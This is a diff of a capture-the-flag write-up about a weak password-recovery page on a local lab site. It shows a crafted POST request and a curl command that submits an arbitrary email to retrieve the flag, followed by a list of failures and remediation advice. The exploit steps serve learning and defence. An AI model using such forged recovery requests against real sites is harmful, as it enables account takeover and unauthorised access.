@@ -1,6 +1,9 @@
-# forgot my password
+# Forgot My Password - Broken Authentication
 
-In Burp I could see that clicking on the recover password I send a POST like 
+## Vulnerability Type
+**OWASP A07:2021 - Identification and Authentication Failures** (CWE-640: Weak Password Recovery Mechanism)
+
+## Exploitation 
 
 ```txt
 POST /index.php?page=recover HTTP/1.1
@@ -34,18 +37,25 @@ curl -X POST http://localhost:8081/index.php\?page\=recover \
      -d "mail=web%40born.com&Submit=Submit" | grep "flag"
 ``` 
 
-the above command would work anytime... No need to inspect or modify the html.
-But modifying the html and inserting the email address in the form shows that the emai adddress is not submitting because it accepts max 15 chars! 
+The above command works anytime—no authentication required. No need to inspect or modify the HTML.
 
-as for the A07:2021 – Identification and Authentication Failures
-https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/
+## Key Failures
 
--Permits brute force or other automated attacks.
--Uses weak or ineffective credential recovery and forgot-password processes, such as "knowledge-based answers," which cannot be made safe.
--Has missing or ineffective multi-factor authentication.
+1. **No authorization check** – Any email address returns the flag (should verify ownership first)
+2. **No rate limiting** – Brute-forceable (could enumerate valid email accounts)
+3. **Exposes sensitive info** – Flag returned directly without verification
+4. **No CSRF protection** – POST request has no token validation
+5. **No OTP/token** – Should send unique recovery link, not immediate flag
 
-## How to prevent
--Do not ship or deploy with any default credentials, particularly for admin users.
+## Remediation
+1. **Implement email verification** – Send a unique, time-limited recovery token (expires in 15-30 min)
+2. **Rate limiting** – Limit password recovery requests per email/IP (e.g., 3 per hour)
+3. **Never expose secrets directly** – Return recovery link, not flags or credentials
+4. **Add CSRF tokens** – Validate `csrf_token` on password recovery forms
+5. **Log recovery attempts** – Monitor suspicious patterns (multiple emails, rapid requests)
+6. **Use HTTPS only** – Encrypt recovery tokens in transit
+7. **Implement MFA** – Require second factor for sensitive operations
+8. **No security questions** – They provide weak verification (knowledge-based answers are guessable)
 
 
 
